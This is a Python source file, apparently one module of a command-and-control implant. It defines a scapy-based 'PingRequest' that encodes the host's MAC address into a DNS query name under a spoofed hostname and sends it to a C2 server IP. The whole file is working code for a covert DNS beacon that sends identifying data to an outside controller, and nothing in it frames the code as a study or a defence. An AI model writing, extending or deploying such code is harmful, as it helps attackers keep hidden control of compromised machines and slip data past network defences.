# external imports
from scapy.all import Ether, IP, UDP, DNS, DNSQR, sendp

# system imports
from uuid import getnode as get_mac

# internal imports
from utils.consts import INTERFACE, CC_SERVER_IP, CC_SERVER_SPOOFED_HOST, PACKET_OPTIONS
from utils.request_type import RequestType

class PingRequest:
    def __init__(self):
        pass
    
    def build(self):
        mac_addr = ''.join(("%012X" % get_mac())[i:i+2] for i in range(0, 12, 2)).lower() 

        ether = Ether()
        ip = IP(dst=CC_SERVER_IP)
        udp = UDP(sport=PACKET_OPTIONS['UDP']['SPORT'], dport=PACKET_OPTIONS['UDP']['DPORT'])
        dns = DNS(
            qr=PACKET_OPTIONS['DNS']['QR'],
            qdcount=1,
            qd=DNSQR(qname=mac_addr + '.' + CC_SERVER_SPOOFED_HOST, qtype=RequestType.PING.value)
        )

        return ether/ip/udp/dns
    
    def send(self):
        sendp(x=self.build(), iface=INTERFACE, verbose=0)